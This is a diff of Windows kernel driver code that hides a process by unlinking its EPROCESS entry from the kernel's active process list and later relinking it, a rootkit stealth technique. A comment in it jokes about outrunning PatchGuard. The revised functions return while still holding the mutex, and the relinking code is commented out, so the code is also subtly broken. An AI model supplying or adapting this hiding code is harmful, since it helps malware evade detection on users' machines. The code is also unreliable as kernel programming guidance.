@@ -168,37 +168,49 @@ namespace eprocess
 
 	void ProcInfo::DetachFromProcessList()
 	{
-		kEprocssMutex.Lock();
-		__try
+		if (kEprocessMutex.Trylock() != true)
 		{
-			// What ever you do, the value-assign must be as quick as possible or BSOD.
-			PLIST_ENTRY cur = GetActiveProcessLinks();
-			RemoveEntryList(cur);
-			SetPrevEntryProc(cur);
-			SetNextEntryProc(cur);
+			return;
 		}
-		__except (EXCEPTION_EXECUTE_HANDLER)
+		if (IsDetached())
 		{
+			return;
 		}
-		kEprocssMutex.Unlock();
+		// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
+		PLIST_ENTRY cur = GetActiveProcessLinks();
+		RemoveEntryList(cur);
+		SetPrevEntryProc(cur);
+		SetNextEntryProc(cur);
+
+		kEprocessMutex.Unlock();
 	}
 
 	void ProcInfo::JoinToProcessList()
 	{
-		kEprocssMutex.Lock();
+		if (kEprocessMutex.Trylock() != true)
+		{
+			return;
+		}
 		if (!IsDetached())
 		{
 			return;
 		}
 
 		// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
-		ProcInfo system_proc(SYSTEM_PROCESS_ID);
-		//ProcInfo next_proc(system_proc.GetNextProc());
+		ProcInfo proc(ProcInfo(ProcInfo(SYSTEM_PROCESS_ID).GetPrevProc()).GetPrevProc());
+		ProcInfo next_proc(proc.GetNextProc());
 		PLIST_ENTRY cur = GetActiveProcessLinks();
-		PLIST_ENTRY prev = system_proc.GetActiveProcessLinks();
-		// What ever you do, the value-assign must be as quick as possible or BSOD.
-		InsertTailList(prev, cur);
-		kEprocssMutex.Unlock();
+		PLIST_ENTRY prev = proc.GetActiveProcessLinks();
+		PLIST_ENTRY next = prev->Flink;
+		// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
+		//InsertTailList(prev, cur);
+		/*
+		cur->Blink = prev;
+		cur->Flink = next;
+		prev->Flink = cur;
+		next->Blink = cur;
+		*/
+		kEprocessMutex.Unlock();
 	}
 
 	bool ProcInfo::IsDetached()
@@ -271,7 +283,7 @@ namespace eprocess
 	{
 		kPidRva = GetPidRva();
 		kAplRva = GetAplRva();
-		kEprocssMutex.Create();
+		kEprocessMutex.Create();
 	}
 }
 
